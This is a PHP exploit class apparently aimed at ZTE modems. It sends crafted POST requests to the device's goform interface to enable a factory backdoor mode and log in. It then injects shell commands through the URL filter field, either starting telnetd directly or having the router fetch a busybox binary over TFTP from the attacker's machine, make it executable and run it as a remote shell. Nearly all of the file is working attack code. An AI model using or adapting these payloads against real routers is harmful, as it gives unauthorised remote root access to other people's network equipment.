<?php

namespace ZTE;

class Hack
{

  private $_modem_ip = "";
  private $_passwd = "";

  public function __construct($modem_ip, $passwd)
  {
    $this->_modem_ip = $modem_ip;
    $this->_passwd = base64_encode($passwd);
  }

  /*
  * Enable Factory Backdoor
  * return @array
  */
  public function factory_backdoor()
  {
    $data ="?isTest=false";
    $data .="&goformId=CHANGE_MODE";
    $data .="&change_mode=2";
    $data .="&password=".$this->_passwd;

    $curl = new Curl($this->_modem_ip, 'POST', $data);
    $result = $curl->get_post();
    $json = new Json('DEC', $result);
    $decode = $json->decode_encode();

    $ret['data'] = $data;
    $ret['result'] = $result;
    $ret['decode'] = $decode;

    return $ret;
  }

  /*
  * Enable Enable Root Access
  * return @array
  */
  public function enable_root_access()
  {
    $data = 'isTest=false';
    $data .= '&goformId=LOGIN';
    $data .= '&password='.$this->_passwd;

    $curl = new Curl($this->_modem_ip, 'POST', $data);
    $result = $curl->get_post();
    $json = new Json('DEC', $result);
    $decode = $json->decode_encode();

    $ret['data'] = $data;
    $ret['result'] = $result;
    $ret['decode'] = $decode;

    return $ret;
  }

  /*
  * Exploits Nvram (Method 2)
  * Requires busybox with telnetd compiled in.
  * Injects &&telnetd&& via the URL filter to start telnetd on port 4719.
  * return @array
  */
  public function exploits_nvram()
  {

    $data = "isTest=false";
    $data .= "&goformId=URL_FILTER_ADD";
    $data .= "&addURLFilter=http%3A%2F%2F_L33T_H4X0R_%2F%26%26telnetd%26%26";

    $curl = new Curl($this->_modem_ip, 'POST', $data);
    $result = $curl->get_post();
    $json = new Json('DEC', $result);
    $decode = $json->decode_encode();

    $ret['data'] = $data;
    $ret['result'] = $result;
    $ret['decode'] = $decode;

    return $ret;
  }

  /*
  * TFTP Telnetd Exploit (Method 3)
  * Use when busybox does NOT have telnetd compiled in (e.g. DNA.fi firmware).
  * Prerequisites:
  *   - Your machine is at 192.168.0.22/24 (or the $tftp_ip you pass)
  *   - A TFTP server is running on that machine
  *   - A MIPS busybox binary with telnetd support is placed in the TFTP root,
  *     renamed to "telnetd"
  * The router will fetch the binary via zte_debug.sh and execute it on port 23.
  * Credentials: admin/admin
  *
  * @param string $tftp_ip  IP of the TFTP server (your machine). Default: 192.168.0.22
  * return @array
  */
  public function tftp_telnetd($tftp_ip = '192.168.0.22')
  {
    // Payload: http://aa&zte_debug.sh <tftp_ip> telnetd
    // The & must be percent-encoded so it is not treated as a second POST field.
    // Spaces are encoded as + (application/x-www-form-urlencoded).
    $filter = 'http://aa&zte_debug.sh ' . $tftp_ip . ' telnetd';
    $encoded = urlencode($filter);

    $data = "isTest=false";
    $data .= "&goformId=URL_FILTER_ADD";
    $data .= "&addURLFilter=" . $encoded;

    $curl = new Curl($this->_modem_ip, 'POST', $data);
    $result = $curl->get_post();
    $json = new Json('DEC', $result);
    $decode = $json->decode_encode();

    $ret['data'] = $data;
    $ret['result'] = $result;
    $ret['decode'] = $decode;

    return $ret;
  }

  /*
  * TFTP Telnetd Exploit - Direct payload (Method 3 fallback)
  * Use when zte_debug.sh does not exist on the firmware.
  * Injects a raw busybox tftp command to fetch and execute telnetd directly.
  *
  * @param string $tftp_ip  IP of the TFTP server (your machine). Default: 192.168.0.22
  * return @array
  */
  public function tftp_telnetd_direct($tftp_ip = '192.168.0.22')
  {
    // Payload: http://aa&tftp -g -r telnetd -l /tmp/telnetd <ip>&&chmod +x /tmp/telnetd&&/tmp/telnetd
    $filter = 'http://aa&tftp -g -r telnetd -l /tmp/telnetd ' . $tftp_ip . '&&chmod +x /tmp/telnetd&&/tmp/telnetd';
    $encoded = urlencode($filter);

    $data = "isTest=false";
    $data .= "&goformId=URL_FILTER_ADD";
    $data .= "&addURLFilter=" . $encoded;

    $curl = new Curl($this->_modem_ip, 'POST', $data);
    $result = $curl->get_post();
    $json = new Json('DEC', $result);
    $decode = $json->decode_encode();

    $ret['data'] = $data;
    $ret['result'] = $result;
    $ret['decode'] = $decode;

    return $ret;
  }

}
